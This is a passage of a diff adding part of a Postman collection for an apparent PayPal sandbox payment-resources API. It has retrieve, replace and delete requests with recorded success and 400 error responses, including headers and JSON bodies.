+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:42:38 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000084-SJC, cache-phx1710091-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506158.074368,VS0,VE90"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"name\": \"INVALID_REQUEST\",\n    \"message\": \"Request is not well-formed, syntactically incorrect, or violates schema.\",\n    \"debug_id\": \"f62724066d579\",\n    \"details\": [\n        {\n            \"issue\": \"PAGE_SIZE_AND_PAGE_TOKEN_BOTH_PROVIDED\",\n            \"description\": \"page_size and page_token cannot be used together.\"\n        }\n    ],\n    \"links\": []\n}"
+        }
+      ]
+    },
+    {
+      "name": "Retrieve a payment resource",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+          "host": [
+            "{{base_url}}"
+          ],
+          "path": [
+            "v1",
+            "checkout",
+            "payment-resources",
+            ":payment_resource_id"
+          ],
+          "variable": [
+            {
+              "key": "payment_resource_id",
+              "value": "{{payment_resource_id}}"
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "200 - Retrieve a payment resource",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources",
+                ":payment_resource_id"
+              ],
+              "variable": [
+                {
+                  "key": "payment_resource_id",
+                  "value": "{{payment_resource_id}}"
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f7522830b759a"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f7522830b759a-e5a497f759c3b52c-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "none"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "content-encoding",
+              "value": "br"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:44:15 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000115-SJC, cache-phx1710091-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506255.402300,VS0,VE340"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            },
+            {
+              "key": "transfer-encoding",
+              "value": "chunked"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-35K4Y759FS59\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            },\n            \"collect_shipping_address\": false\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-01-15T19:37:08Z\",\n    \"update_time\": \"2026-01-15T19:37:08Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-35K4Y759FS59\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-35K4Y759FS59\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-35K4Y759FS59\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-35K4Y759FS59\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-35K4Y759FS59\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "400 Bad Request - Missing resource ID",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources",
+                ":payment_resource_id"
+              ],
+              "variable": [
+                {
+                  "key": "payment_resource_id",
+                  "value": ""
+                }
+              ]
+            }
+          },
+          "status": "Bad Request",
+          "code": 400,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "338"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f703866899fa3"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f703866899fa3-2c075f3e22c94c40-01\""
+            },
+            {
+              "key": "Validation-Exception",
+              "value": "true"
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:45:05 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000096-SJC, cache-phx1710091-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506306.798788,VS0,VE83"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"name\": \"INVALID_REQUEST\",\n    \"message\": \"Request is not well-formed, syntactically incorrect, or violates schema.\",\n    \"debug_id\": \"f703866899fa3\",\n    \"details\": [\n        {\n            \"field\": \"id\",\n            \"value\": \":payment_resource_id\",\n            \"location\": \"body\",\n            \"issue\": \"INVALID_PARAMETER_SYNTAX\",\n            \"description\": \"the value of a field does not conform to the expected format.\"\n        }\n    ],\n    \"links\": []\n}"
+        }
+      ]
+    },
+    {
+      "name": "Replace a payment resource",
+      "request": {
+        "method": "PUT",
+        "header": [],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"79.99\"\n            }\n        }\n    ]\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+          "host": [
+            "{{base_url}}"
+          ],
+          "path": [
+            "v1",
+            "checkout",
+            "payment-resources",
+            ":payment_resource_id"
+          ],
+          "variable": [
+            {
+              "key": "payment_resource_id",
+              "value": "{{payment_resource_id}}"
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "204 - Replace a payment source",
+          "originalRequest": {
+            "method": "PUT",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"79.99\"\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources",
+                ":payment_resource_id"
+              ],
+              "variable": [
+                {
+                  "key": "payment_resource_id",
+                  "value": "{{payment_resource_id}}"
+                }
+              ]
+            }
+          },
+          "_postman_previewlanguage": null,
+          "header": null,
+          "cookie": [],
+          "body": null
+        },
+        {
+          "name": "400 Bad Request - Missing resource ID",
+          "originalRequest": {
+            "method": "PUT",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"79.99\"\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources",
+                ":payment_resource_id"
+              ],
+              "variable": [
+                {
+                  "key": "payment_resource_id",
+                  "value": ""
+                }
+              ]
+            }
+          },
+          "status": "Bad Request",
+          "code": 400,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "338"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f5674529eb926"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f5674529eb926-9ab0e9273d0d5b7e-01\""
+            },
+            {
+              "key": "Validation-Exception",
+              "value": "true"
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:47:20 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000092-SJC, cache-phx1710068-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506440.265714,VS0,VE164"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"name\": \"INVALID_REQUEST\",\n    \"message\": \"Request is not well-formed, syntactically incorrect, or violates schema.\",\n    \"debug_id\": \"f5674529eb926\",\n    \"details\": [\n        {\n            \"field\": \"id\",\n            \"value\": \":payment_resource_id\",\n            \"location\": \"body\",\n            \"issue\": \"INVALID_PARAMETER_SYNTAX\",\n            \"description\": \"the value of a field does not conform to the expected format.\"\n        }\n    ],\n    \"links\": []\n}"
+        }
+      ]
+    },
+    {
+      "name": "Delete a payment resource",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              ""
+            ],
+            "type": "text/javascript",
+            "packages": {},
+            "requests": {}
+          }
+        }
+      ],
+      "request": {
+        "method": "DELETE",
+        "header": [],
+        "url": {
+          "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+          "host": [
+            "{{base_url}}"
+          ],
+          "path": [
+            "v1",
+            "checkout",
+            "payment-resources",
+            ":payment_resource_id"
+          ],
+          "variable": [
+            {
+              "key": "payment_resource_id",
+              "value": "{{payment_resource_id}}"
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "204 - Delete a payment resource",
+          "originalRequest": {
+            "method": "DELETE",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources",
+                ":payment_resource_id"
+              ],
+              "variable": [
+                {
+                  "key": "payment_resource_id",
+                  "value": "{{payment_resource_id}}"
+                }
+              ]
+            }
+          },
+          "status": "No Content",
+          "code": 204,
+          "_postman_previewlanguage": "plain",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f31744438bad4"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f31744438bad4-6b7ef1e97305793f-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:47:55 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000118-SJC, cache-phx1710068-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506475.822255,VS0,VE541"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": null
+        },
+        {
+          "name": "400 Bad Request - Missing resource ID",
+          "originalRequest": {
+            "method": "DELETE",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources/:payment_resource_id",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources",
+                ":payment_resource_id"
+              ],
+              "variable": [
+                {
+                  "key": "payment_resource_id",
+                  "value": ""
+                }
+              ]
+            }
+          },
+          "status": "Bad Request",
+          "code": 400,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "338"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f31752529a35a"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f31752529a35a-7ea554d72fe93be7-01\""
+            },
+            {
+              "key": "Validation-Exception",
+              "value": "true"
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:48:16 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000106-SJC, cache-phx1710068-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506497.825822,VS0,VE111"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"name\": \"INVALID_REQUEST\",\n    \"message\": \"Request is not well-formed, syntactically incorrect, or violates schema.\",\n    \"debug_id\": \"f31752529a35a\",\n    \"details\": [\n        {\n            \"field\": \"id\",\n            \"value\": \":payment_resource_id\",\n            \"location\": \"body\",\n            \"issue\": \"INVALID_PARAMETER_SYNTAX\",\n            \"description\": \"the value of a field does not conform to the expected format.\"\n        }\n    ],\n    \"links\": []\n}"
+        }
+      ]
+    }
+  ]
+}
